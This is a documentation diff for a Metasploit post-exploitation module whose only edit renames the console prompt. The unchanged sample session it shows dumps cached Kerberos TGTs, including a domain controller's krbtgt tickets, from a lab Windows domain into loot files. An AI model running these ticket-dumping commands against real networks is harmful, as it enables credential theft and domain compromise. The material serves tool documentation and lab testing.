@@ -36,12 +36,12 @@ In this case the operator lists the currently cached Kerberos tickets in the Met
 command is used again to show the newly added TGTs.
 
 ```
-msf6 post(windows/manage/kerberos_tickets) > klist
+msf post(windows/manage/kerberos_tickets) > klist
 Kerberos Cache
 ==============
 No tickets
 
-msf6 post(windows/manage/kerberos_tickets) > run SESSION=-1 SERVICE=krbtgt/*
+msf post(windows/manage/kerberos_tickets) > run SESSION=-1 SERVICE=krbtgt/*
 
 [*] LSA Handle: 0x000001efe1bf7270
 [*] LogonSession LUID: 0x00004bc1d 
@@ -388,7 +388,7 @@ msf6 post(windows/manage/kerberos_tickets) > run SESSION=-1 SERVICE=krbtgt/*
 [*]   LogonType:             Network (3)
 [*]   LogonTime:             2023-08-23 08:33:17 -0400
 [*] Post module execution completed
-msf6 post(windows/manage/kerberos_tickets) > klist
+msf post(windows/manage/kerberos_tickets) > klist
 Kerberos Cache
 ==============
 id   host            principal               sname                             issued                     status  path
@@ -401,5 +401,5 @@ id   host            principal               sname                             i
 402  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135507_default_192.168.159.10_mit.kerberos.cca_909298.bin
 403  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135508_default_192.168.159.10_mit.kerberos.cca_938606.bin
 
-msf6 post(windows/manage/kerberos_tickets) >
+msf post(windows/manage/kerberos_tickets) >
 ```
